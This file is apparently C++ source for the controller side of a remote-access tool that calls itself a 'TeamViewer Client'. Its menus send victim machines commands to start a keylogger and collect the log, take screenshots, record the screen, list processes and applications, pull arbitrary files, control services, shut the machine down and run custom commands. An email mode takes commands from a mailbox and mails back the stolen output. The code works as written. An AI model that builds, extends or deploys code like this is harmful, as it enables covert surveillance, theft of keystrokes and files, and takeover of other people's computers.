#define WIN32_LEAN_AND_MEAN

#include "src/network.h"
#include "src/utils.h"
#include "src/config.h"
#include "src/email_utils.h"
#include "src/email_function.h"

#include <iostream>
#include <string>
#include <sstream>
#include <fstream>
#include <algorithm>
#include <vector>
#include <chrono>
#include <winsock2.h>
#include <ws2tcpip.h>
#include <filesystem>
#include <thread>
#include <curl/curl.h>
#include <atomic>
#include <conio.h> // For _kbhit() and _getch()

#pragma comment(lib, "ws2_32.lib")

namespace fs = std::filesystem;
using namespace std;

enum class ClientMode {
    CONSOLE,
    EMAIL
};

enum class ConnectionStatus {
    DISCONNECTED,
    CONNECTING,
    CONNECTED,
    CONNECTION_FAILED
};

struct ServerInfo {
    string name;
    string ip;
    int port;
    
    ServerInfo(const string& n, const string& i, int p) : name(n), ip(i), port(p) {}
    
    string toString() const {
        return name + " (" + ip + ":" + to_string(port) + ")";
    }
    
    string toFileString() const {
        return name + "|" + ip + "|" + to_string(port);
    }
};

// Global variables
atomic<bool> stopEmailMonitoring(false);
vector<ServerInfo> serverList;
int currentServerIndex = -1;
SOCKET globalClientSocket = INVALID_SOCKET;
ConnectionStatus connectionStatus = ConnectionStatus::DISCONNECTED;
string connectionStatusMessage = "";
const string SERVER_LIST_FILE = Config::BASE_DIR + "temp_client/servers.txt";

bool processEmailCommand();

// Connection status functions
string getConnectionStatusString(ConnectionStatus status) {
    switch (status) {
        case ConnectionStatus::DISCONNECTED:
            return "DISCONNECTED";
        case ConnectionStatus::CONNECTING:
            return "CONNECTING...";
        case ConnectionStatus::CONNECTED:
            return "CONNECTED";
        case ConnectionStatus::CONNECTION_FAILED:
            return "CONNECTION FAILED";
        default:
            return "UNKNOWN";
    }
}

void setConnectionStatus(ConnectionStatus status, const string& message = "") {
    connectionStatus = status;
    connectionStatusMessage = message;
    LogToFile("Connection status changed to: " + getConnectionStatusString(status) + 
              (message.empty() ? "" : " - " + message));
}

void displayConnectionStatus() {
    cout << "\n========== CONNECTION STATUS ==========\n";
    if (currentServerIndex >= 0) {
        cout << "Selected Server: " << serverList[currentServerIndex].toString() << endl;
        cout << "Connection Status: " << getConnectionStatusString(connectionStatus);
        if (!connectionStatusMessage.empty()) {
            cout << " - " << connectionStatusMessage;
        }
        cout << endl;
    } else {
        cout << "Selected Server: None" << endl;
        cout << "Connection Status: No server selected" << endl;
    }
    cout << "=====================================\n";
}

void saveServerList() {
    ofstream file(SERVER_LIST_FILE);
    if (file.is_open()) {
        for (const auto& server : serverList) {
            file << server.toFileString() << endl;
        }
        file.close();
        LogToFile("Server list saved to " + SERVER_LIST_FILE);
    } else {
        LogToFile("Failed to save server list to " + SERVER_LIST_FILE);
    }
}

// Server management functions
void loadServerList() {
    serverList.clear();
    ifstream file(SERVER_LIST_FILE);
    if (!file.is_open()) {
        // Create default servers if file doesn't exist
        serverList.push_back(ServerInfo("Local Server", "127.0.0.1", 12345));
        saveServerList();
        return;
    }
    
    string line;
    while (getline(file, line)) {
        if (line.empty()) continue;
        
        size_t pos1 = line.find('|');
        size_t pos2 = line.find('|', pos1 + 1);
        
        if (pos1 != string::npos && pos2 != string::npos) {
            string name = line.substr(0, pos1);
            string ip = line.substr(pos1 + 1, pos2 - pos1 - 1);
            string portStr = line.substr(pos2 + 1);
            
            try {
                int port = stoi(portStr);
                serverList.push_back(ServerInfo(name, ip, port));
            } catch (...) {
                // Skip invalid lines
            }
        }
    }
    file.close();
    
    if (serverList.empty()) {
        serverList.push_back(ServerInfo("Local Server", "127.0.0.1", 12345));
    }
}

void displayServerList() {
    cout << "\n========== SERVER LIST ==========\n";
    if (serverList.empty()) {
        cout << "No servers configured.\n";
    } else {
        for (size_t i = 0; i < serverList.size(); ++i) {
            cout << (i + 1) << ". " << serverList[i].toString();
            if (static_cast<int>(i) == currentServerIndex) {
                cout << " [CURRENT]";
            }
            cout << endl;
        }
    }
    cout << "================================\n";
}

void addServer() {
    cout << "\n--- Add New Server ---\n";
    cout << "Enter server name: ";
    string name;
    getline(cin, name);
    
    if (name.empty()) {
        cout << "Server name cannot be empty." << endl;
        return;
    }
    
    cout << "Enter server IP: ";
    string ip;
    getline(cin, ip);
    
    if (ip.empty()) {
        cout << "Server IP cannot be empty." << endl;
        return;
    }
    
    cout << "Enter server port: ";
    string portStr;
    getline(cin, portStr);
    
    try {
        int port = stoi(portStr);
        if (port <= 0 || port > 65535) {
            cout << "Invalid port number. Must be between 1-65535." << endl;
            return;
        }
        
        serverList.push_back(ServerInfo(name, ip, port));
        saveServerList();
        cout << "Server added successfully: " << name << " (" << ip << ":" << port << ")" << endl;
        LogToFile("Added server: " + name + " (" + ip + ":" + to_string(port) + ")");
    } catch (...) {
        cout << "Invalid port number." << endl;
    }
}

void removeServer() {
    if (serverList.empty()) {
        cout << "No servers to remove." << endl;
        return;
    }
    
    displayServerList();
    cout << "Enter server number to remove (1-" << serverList.size() << "): ";
    string input;
    getline(cin, input);
    
    try {
        int index = stoi(input) - 1;
        if (index < 0 || index >= static_cast<int>(serverList.size())) {
            cout << "Invalid server number." << endl;
            return;
        }
        
        // Disconnect if removing current server
        if (currentServerIndex == index && connectionStatus == ConnectionStatus::CONNECTED) {
            if (globalClientSocket != INVALID_SOCKET) {
                closesocket(globalClientSocket);
                globalClientSocket = INVALID_SOCKET;
            }
            setConnectionStatus(ConnectionStatus::DISCONNECTED);
            cout << "Disconnected from server (server being removed)." << endl;
        }
        
        string removedServer = serverList[index].toString();
        serverList.erase(serverList.begin() + index);
        
        // Adjust current server index
        if (currentServerIndex == index) {
            currentServerIndex = -1;
        } else if (currentServerIndex > index) {
            currentServerIndex--;
        }
        
        saveServerList();
        cout << "Server removed: " << removedServer << endl;
        LogToFile("Removed server: " + removedServer);
    } catch (...) {
        cout << "Invalid input." << endl;
    }
}

bool selectServer() {
    if (serverList.empty()) {
        cout << "No servers available. Please add a server first." << endl;
        return false;
    }
    
    displayServerList();
    cout << "Enter server number to select (1-" << serverList.size() << "): ";
    string input;
    getline(cin, input);
    
    try {
        int index = stoi(input) - 1;
        if (index < 0 || index >= static_cast<int>(serverList.size())) {
            cout << "Invalid server number." << endl;
            return false;
        }
        
        // Disconnect from current server if connected and switching to different server
        if (connectionStatus == ConnectionStatus::CONNECTED && currentServerIndex != index) {
            if (globalClientSocket != INVALID_SOCKET) {
                closesocket(globalClientSocket);
                globalClientSocket = INVALID_SOCKET;
            }
            setConnectionStatus(ConnectionStatus::DISCONNECTED, "Switched to different server");
            cout << "Disconnected from previous server." << endl;
        }
        
        currentServerIndex = index;
        cout << "Selected server: " << serverList[currentServerIndex].toString() << endl;
        LogToFile("Selected server: " + serverList[currentServerIndex].toString());
        return true;
    } catch (...) {
        cout << "Invalid input." << endl;
        return false;
    }
}

bool connectToSelectedServer() {
    if (currentServerIndex < 0) {
        cout << "No server selected. Please select a server first." << endl;
        return false;
    }
    
    if (connectionStatus == ConnectionStatus::CONNECTED) {
        cout << "Already connected to " << serverList[currentServerIndex].toString() << endl;
        return true;
    }
    
    const ServerInfo& server = serverList[currentServerIndex];
    cout << "Connecting to " << server.toString() << "..." << endl;
    setConnectionStatus(ConnectionStatus::CONNECTING);
    
    // Create socket
    globalClientSocket = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
    if (globalClientSocket == INVALID_SOCKET) {
        string error = "Socket creation failed: " + to_string(WSAGetLastError());
        cout << error << endl;
        setConnectionStatus(ConnectionStatus::CONNECTION_FAILED, error);
        return false;
    }

    // Server address
    sockaddr_in serverAddr;
    serverAddr.sin_family = AF_INET;
    serverAddr.sin_port = htons(server.port);
    if (inet_pton(AF_INET, server.ip.c_str(), &serverAddr.sin_addr) <= 0) {
        string error = "Invalid server IP address: " + server.ip;
        cout << error << endl;
        setConnectionStatus(ConnectionStatus::CONNECTION_FAILED, error);
        closesocket(globalClientSocket);
        globalClientSocket = INVALID_SOCKET;
        return false;
    }

    // Connect to server
    if (connect(globalClientSocket, (struct sockaddr*)&serverAddr, sizeof(serverAddr)) == SOCKET_ERROR) {
        string error = "Connection failed: " + to_string(WSAGetLastError());
        cout << error << endl;
        setConnectionStatus(ConnectionStatus::CONNECTION_FAILED, error);
        closesocket(globalClientSocket);
        globalClientSocket = INVALID_SOCKET;
        return false;
    }

    cout << "Successfully connected to " << server.toString() << endl;
    setConnectionStatus(ConnectionStatus::CONNECTED, "Connection established");
    return true;
}

bool disconnectFromServer() {
    if (connectionStatus != ConnectionStatus::CONNECTED) {
        cout << "Not connected to any server." << endl;
        return false;
    }
    
    if (globalClientSocket != INVALID_SOCKET) {
        closesocket(globalClientSocket);
        globalClientSocket = INVALID_SOCKET;
    }
    
    cout << "Disconnected from server." << endl;
    setConnectionStatus(ConnectionStatus::DISCONNECTED, "User disconnected");
    return true;
}

void manageServers() {
    while (true) {
        system("cls");
        cout << "\n========== SERVER MANAGEMENT ==========\n";
        displayServerList();
        displayConnectionStatus();
        cout << "\n1. Add Server\n";
        cout << "2. Remove Server\n";
        cout << "3. Select Server\n";
        cout << "4. Connect to Selected Server\n";
        cout << "5. Disconnect from Server\n";
        cout << "6. Back to Main Menu\n";
        cout << "======================================\n";
        cout << "Choose option: ";
        
        string input;
        getline(cin, input);
        
        if (input.empty()) continue;
        
        int choice;
        try {
            choice = stoi(input);
        } catch (...) {
            cout << "Invalid option. Please try again." << endl;
            cout << "\nPress Enter to continue...";
            cin.get();
            continue;
        }
        
        switch (choice) {
            case 1:
                addServer();
                break;
            case 2:
                removeServer();
                break;
            case 3:
                selectServer();
                break;
            case 4:
                connectToSelectedServer();
                break;
            case 5:
                disconnectFromServer();
                break;
            case 6:
                return;
            default:
                cout << "Invalid option. Please try again." << endl;
        }
        
        if (choice != 6) {
            cout << "\nPress Enter to continue...";
            cin.get();
        }
    }
}

void displayMenu() {
    system("cls");
    cout << "\n========== TEAMVIEWER CLIENT MENU ==========\n";
    cout << "1. Switch to Email Mode (Current: Console Mode)\n";
    cout << "2. Manage Servers\n";
    cout << "3. Send Command to Server\n";
    cout << "4. View Connection Status\n";
    cout << "5. Quick Connect/Disconnect\n";
    cout << "6. Exit\n";
    cout << "============================================\n";
    
    // Display current connection info
    if (currentServerIndex >= 0) {
        cout << "Current Server: " << serverList[currentServerIndex].toString() << endl;
        cout << "Status: " << getConnectionStatusString(connectionStatus);
        if (!connectionStatusMessage.empty()) {
            cout << " (" << connectionStatusMessage << ")";
        }
        cout << endl;
    } else {
        cout << "Current Server: None selected" << endl;
        cout << "Status: No server selected" << endl;
    }
    cout << "Choose option: ";
}

void displayEmailModeMenu() {
    system("cls");
    cout << "\n========== EMAIL MODE MENU ==========\n";
    cout << "1. Switch to Console Mode (Current: Email Mode)\n";
    cout << "2. Start Email Monitoring (Auto mode)\n";
    cout << "3. Check Email Once\n";
    cout << "4. Exit\n";
    cout << "=====================================\n";
    cout << "Note: In auto monitoring mode, you can type 'stop' to exit\n";
    cout << "Choose option: ";
}

bool waitForInput(string& input, int timeoutSeconds) {
    cout << "Waiting " << timeoutSeconds << " seconds before next check..." << endl;
    cout << "Type 'stop' and press Enter to exit monitoring, or just wait..." << endl;
    cout << "> ";
    
    // Set up for non-blocking input with timeout
    auto start = chrono::steady_clock::now();
    while (chrono::duration_cast<chrono::seconds>(chrono::steady_clock::now() - start).count() < timeoutSeconds) {
        if (_kbhit()) {
            getline(cin, input);
            return true; // User provided input
        }
        this_thread::sleep_for(chrono::milliseconds(100));
    }
    
    cout << "\nTimeout reached, continuing monitoring..." << endl;
    return false; // Timeout, no input
}

void emailMonitoringWorker() {
    while (!stopEmailMonitoring.load()) {
        cout << "\n--- Checking for new emails ---" << endl;
        processEmailCommand();
        
        // Wait 30 seconds but check for stop signal every second
        for (int i = 0; i < 30 && !stopEmailMonitoring.load(); ++i) {
            this_thread::sleep_for(chrono::seconds(1));
        }
    }
}

void displayCommandMenu() {
    system("cls");
    cout << "\n========== AVAILABLE COMMANDS ==========\n";
    cout << "1. startkeylogger - Start keylogger\n";
    cout << "2. stopkeylogger - Stop keylogger and get log\n";
    cout << "3. screenshot - Take screenshot\n";
    cout << "4. record <duration> - Record screen (seconds)\n";
    cout << "5. listProcess - List running processes\n";
    cout << "6. listApp - List installed applications\n";
    cout << "7. getDxdiag - Get system information\n";
    cout << "8. getFile <filepath> - Download file from server\n";
    cout << "9. Start <service> - Start a service\n";
    cout << "10. Stop <service> - Stop a service\n";
    cout << "11. Shutdown_Reset - Shutdown or reset server\n";
    cout << "12. Custom command\n";
    cout << "13. Back to main menu\n";
    cout << "=======================================\n";
    
    // Show connection status
    displayConnectionStatus();
    cout << "Choose option: ";
}

bool connectToServer(SOCKET& clientSocket, const string& ip, int port) {
    // Create socket
    clientSocket = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
    if (clientSocket == INVALID_SOCKET) {
        cout << "Socket creation failed: " << WSAGetLastError() << endl;
        LogToFile("Socket creation failed: " + to_string(WSAGetLastError()));
        return false;
    }

    // Server address
    sockaddr_in serverAddr;
    serverAddr.sin_family = AF_INET;
    serverAddr.sin_port = htons(port);
    if (inet_pton(AF_INET, ip.c_str(), &serverAddr.sin_addr) <= 0) {
        cout << "Invalid server IP address: " << ip << endl;
        LogToFile("Invalid server IP address: " + ip);
        closesocket(clientSocket);
        return false;
    }

    // Connect to server
    if (connect(clientSocket, (struct sockaddr*)&serverAddr, sizeof(serverAddr)) == SOCKET_ERROR) {
        cout << "Connection failed: " << WSAGetLastError() << endl;
        LogToFile("Connection failed: " + to_string(WSAGetLastError()));
        closesocket(clientSocket);
        return false;
    }

    cout << "Connected to server at " << ip << ":" << port << endl;
    LogToFile("Connected to server at " + ip + ":" + to_string(port));
    return true;
}

string getCommandInput(int choice) {
    string command;
    string parameter;
    
    switch (choice) {
        case 1:
            return "startkeylogger";
        case 2:
            return "stopkeylogger";
        case 3:
            return "screenshot";
        case 4:
            cout << "Enter duration in seconds: ";
            getline(cin, parameter);
            return "record " + parameter;
        case 5:
            return "listProcess";
        case 6:
            return "listApp";
        case 7:
            return "getDxdiag";
        case 8:
            cout << "Enter file path: ";
            getline(cin, parameter);
            return "getFile " + parameter;
        case 9:
            cout << "Enter service name: ";
            getline(cin, parameter);
            return "Start " + parameter;
        case 10:
            cout << "Enter service name: ";
            getline(cin, parameter);
            return "Stop " + parameter;
        case 11:
            return "Shutdown_Reset";
        case 12:
            cout << "Enter custom command: ";
            getline(cin, command);
            return command;
        default:
            return "";
    }
}

bool processCommand(SOCKET clientSocket, const string& command, const string& fromEmail = "") {
    string fileName;
    bool expectFile = false;
    bool isEmailMode = !fromEmail.empty();
    
    // Determine if command expects file response
    if (command == "stopkeylogger" || command == "listProcess" || command == "getDxdiag" || 
        command == "listApp" || command.find("record") == 0 || command.find("screenshot") == 0) {
        expectFile = true;
        if (command.find("record") == 0) {
            fileName = Config::VIDEO_RECEIVED_PATH;
        } else if (command == "stopkeylogger") {
            fileName = Config::KEYLOG_RECEIVED_PATH;
        } else if (command == "listProcess") {
            fileName = Config::PROCESS_LIST_RECEIVED_PATH;
        } else if (command == "getDxdiag") {
            fileName = Config::DXDIAG_RECEIVED_PATH;
        } else if (command == "listApp") {
            fileName = Config::APP_LIST_RECEIVED_PATH;
        } else if (command == "screenshot") {
            fileName = Config::SCREENSHOT_RECEIVED_PATH;
        }
    } else if (command.find("getFile") == 0) {
        expectFile = true;
        string parameter = command.substr(8);
        fileName = Config::BASE_DIR + "temp_client/" + getFileName(parameter);
    }

    // Create and send command file
    CreateCommandFile(command);
    if (!SendFile(clientSocket, Config::COMMAND_FILE_PATH)) {
        cout << "Failed to send command file" << endl;
        LogToFile("Failed to send command file");
        return false;
    }

    if (expectFile) {
        string response;
        bool continueReceiving = true;
        while (continueReceiving) {
            if (!ReceiveResponse(clientSocket, response)) {
                continueReceiving = false;
                break;
            }
            
            response.erase(response.find_last_not_of("\r\n\t ") + 1);
            LogToFile("Checking response: '" + response + "'");
            
            if (isValidNumber(response)) {
                try {
                    size_t fileSize = stoull(response);
                    LogToFile("Expected file size: " + to_string(fileSize));
                    
                    if (ReceiveFile(clientSocket, fileName, fileSize)) {
                        cout << "File received successfully: " << fileName << endl;
                        
                        if (isEmailMode) {
                            // Send via email
                            string access_token;
                            if (getAccessToken(access_token)) {
                                if (sendMail(access_token, fromEmail, convert_backslashes_to_slashes(fileName))) {
                                    cout << "Email sent successfully to " << fromEmail << endl;
                                    LogToFile("Sent email with file: " + fileName + " to " + fromEmail);
                                } else {
                                    cout << "Failed to send email" << endl;
                                    LogToFile("Failed to send email with file: " + fileName);
                                }
                            }
                        } else {
                            // Console mode - just notify file saved
                            cout << "File saved to: " << fileName << endl;
                            cout << "You can find the file at the above location." << endl;
                        }
                    }
                    continueReceiving = false;
                } catch (...) {
                    cout << "Failed to parse file size: " << response << endl;
                    LogToFile("Failed to parse file size: " + response);
                    continueReceiving = false;
                }
            } else {
                cout << "Server response: " << response << endl;
                LogToFile("Server response: " + response);
            }
        }
    } else {
        string response;
        if (ReceiveResponse(clientSocket, response)) {
            cout << "Command executed successfully" << endl;
        }
    }
    
    return true;
}

bool processEmailCommand() {
    string access_token;
    if (!getAccessToken(access_token)) {
        cout << "Unable to get access token\n";
        LogToFile("Unable to get access token");
        return false;
    }

    readMail(Config::EMAIL_CONTENT_PATH, access_token);
    LogToFile("Checked emails");

    string ipPort, command, fromEmail;
    if (!ReadEmailContent(ipPort, command, fromEmail)) {
        cout << "No valid email content found" << endl;
        LogToFile("No valid email content found");
        return false;
    }

    cout << "Email content read: IP:Port = " << ipPort << ", Command = " << command << ", From = " << fromEmail << endl;
    LogToFile("Email content read: IP:Port = " + ipPort + ", Command = " + command + ", From = " + fromEmail);

    // Parse IP and port
    size_t colonPos = ipPort.find(':');
    if (colonPos == string::npos) {
        cout << "Invalid IP:port format: " << ipPort << endl;
        LogToFile("Invalid IP:port format: " + ipPort);
        return false;
    }
    
    string ip = ipPort.substr(0, colonPos);
    string portStr = ipPort.substr(colonPos + 1);
    int port;
    try {
        port = stoi(portStr);
    } catch (...) {
        cout << "Invalid port number: " << portStr << endl;
        LogToFile("Invalid port number: " + portStr);
        return false;
    }

    // Connect and process command
    SOCKET clientSocket;
    if (connectToServer(clientSocket, ip, port)) {
        bool result = processCommand(clientSocket, command, fromEmail);
        closesocket(clientSocket);
        return result;
    }
    
    return false;
}

void runConsoleMode() {
    while (true) {
        displayMenu();
        
        string input;
        getline(cin, input);
        
        if (input.empty()) continue;
        
        int choice;
        try {
            choice = stoi(input);
        } catch (...) {
            cout << "Invalid option. Please try again." << endl;
            cout << "\nPress Enter to continue...";
            cin.get();
            continue;
        }
        
        switch (choice) {
            case 1: // Switch to email mode
                if (connectionStatus == ConnectionStatus::CONNECTED) {
                    disconnectFromServer();
                }
                return; // Return to main to switch mode
                
            case 2: // Manage servers
                manageServers();
                break;
                
            case 3: { // Send command
                if (connectionStatus != ConnectionStatus::CONNECTED) {
                    cout << "Not connected to server. Please connect first." << endl;
                    cout << "\nPress Enter to continue...";
                    cin.get();
                    break;
                }
                
                while (true) {
                    displayCommandMenu();
                    getline(cin, input);
                    
                    if (input.empty()) continue;
                    
                    int cmdChoice;
                    try {
                        cmdChoice = stoi(input);
                    } catch (...) {
                        cout << "Invalid option. Please try again." << endl;
                        cout << "\nPress Enter to continue...";
                        cin.get();
                        continue;
                    }
                    
                    if (cmdChoice == 13) { // Back to main menu
                        break;
                    }
                    
                    string command = getCommandInput(cmdChoice);
                    if (!command.empty()) {
                        cout << "Executing command: " << command << endl;
                        processCommand(globalClientSocket, command);
                        cout << "\nPress Enter to continue...";
                        cin.get();
                    } else {
                        cout << "Invalid command option." << endl;
                        cout << "\nPress Enter to continue...";
                        cin.get();
                    }
                }
                break;
            }
                
            case 4: { // View connection status
                system("cls");
                displayConnectionStatus();
                cout << "\nPress Enter to continue...";
                cin.get();
                break;
            }
                
            case 5: { // Quick connect/disconnect
                if (connectionStatus == ConnectionStatus::CONNECTED) {
                    disconnectFromServer();
                } else {
                    connectToSelectedServer();
                }
                cout << "\nPress Enter to continue...";
                cin.get();
                break;
            }
                
            case 6: // Exit
                if (connectionStatus == ConnectionStatus::CONNECTED) {
                    disconnectFromServer();
                }
                return;
                
            default:
                cout << "Invalid option. Please try again." << endl;
                cout << "\nPress Enter to continue...";
                cin.get();
        }
    }
}

void runEmailMode() {
    while (true) {
        displayEmailModeMenu();
        
        string input;
        getline(cin, input);
        
        if (input.empty()) continue;
        
        int choice;
        try {
            choice = stoi(input);
        } catch (...) {
            cout << "Invalid option. Please try again." << endl;
            continue;
        }
        
        switch (choice) {
            case 1: // Switch to console mode
                return;
                
            case 2: { // Start email monitoring (auto mode)
                cout << "Starting email monitoring..." << endl;
                cout << "You can type 'stop' during the waiting period to exit." << endl;
                cout << "Checking emails every 30 seconds..." << endl;
                
                bool continueMonitoring = true;
                while (continueMonitoring) {
                    cout << "\n--- Checking for new emails ---" << endl;
                    processEmailCommand();
                    
                    // Wait for 30 seconds or user input
                    string userInput;
                    if (waitForInput(userInput, 30)) {
                        if (userInput == "stop" || userInput == "STOP") {
                            cout << "Stopping email monitoring..." << endl;
                            continueMonitoring = false;
                        } else {
                            cout << "Unknown command. Type 'stop' to exit monitoring." << endl;
                        }
                    }
                }
                
                cout << "Email monitoring stopped. Returning to menu..." << endl;
                cout << "\nPress Enter to continue...";
                cin.get();
                break;
            }
                
            case 3: // Check email once
                cout << "Checking emails once..." << endl;
                processEmailCommand();
                cout << "\nPress Enter to continue...";
                cin.get();
                break;
                
            case 4: // Exit
                return;
                
            default:
                cout << "Invalid option. Please try again." << endl;
        }
    }
}

int main(void) {
    // Initialize curl
    CURLcode curlInitRes = curl_global_init(CURL_GLOBAL_ALL);
    if (curlInitRes != CURLE_OK) {
        cout << "curl_global_init() failed: " << curl_easy_strerror(curlInitRes) << endl;
        LogToFile("curl_global_init() failed: " + string(curl_easy_strerror(curlInitRes)));
        return 1;
    }

    // Create temp directory
    fs::create_directories(Config::BASE_DIR + "temp_client/");

    // Initialize Winsock
    WSADATA wsaData;
    if (WSAStartup(MAKEWORD(2, 2), &wsaData) != 0) {
        cout << "WSAStartup failed: " << WSAGetLastError() << endl;
        LogToFile("WSAStartup failed: " + to_string(WSAGetLastError()));
        curl_global_cleanup();
        return 1;
    }
    
    // Load server list
    loadServerList();
    
    cout << "========== TEAMVIEWER CLIENT ==========\n";
    cout << "Welcome to TeamViewer Client!\n";
    cout << "You can switch between Console mode and Email mode.\n";
    cout << "=====================================\n";
    
    LogToFile("Client started");
    
    ClientMode currentMode = ClientMode::CONSOLE;
    
    while (true) {
        system("cls");
        cout << "\n========== MODE SELECTION ==========\n";
        cout << "Current Mode: " << (currentMode == ClientMode::CONSOLE ? "Console" : "Email") << endl;
        cout << "1. Console Mode - Interactive command interface\n";
        cout << "2. Email Mode - Process commands from email\n";
        cout << "3. Exit\n";
        cout << "==================================\n";
        cout << "Choose mode: ";
        
        string input;
        getline(cin, input);
        
        if (input.empty()) continue;
        
        int choice;
        try {
            choice = stoi(input);
        } catch (...) {
            cout << "Invalid option. Please try again." << endl;
            continue;
        }
        
        switch (choice) {
            case 1:
                currentMode = ClientMode::CONSOLE;
                cout << "\n--- Entering Console Mode ---\n";
                runConsoleMode();
                break;
                
            case 2:
                currentMode = ClientMode::EMAIL;
                cout << "\n--- Entering Email Mode ---\n";
                runEmailMode();
                break;
                
            case 3:
                cout << "Exiting..." << endl;
                WSACleanup();
                curl_global_cleanup();
                LogToFile("Client exited");
                return 0;
                
            default:
                cout << "Invalid option. Please try again." << endl;
        }
    }

    WSACleanup();
    curl_global_cleanup();
    LogToFile("Client exited");
    return 0;
}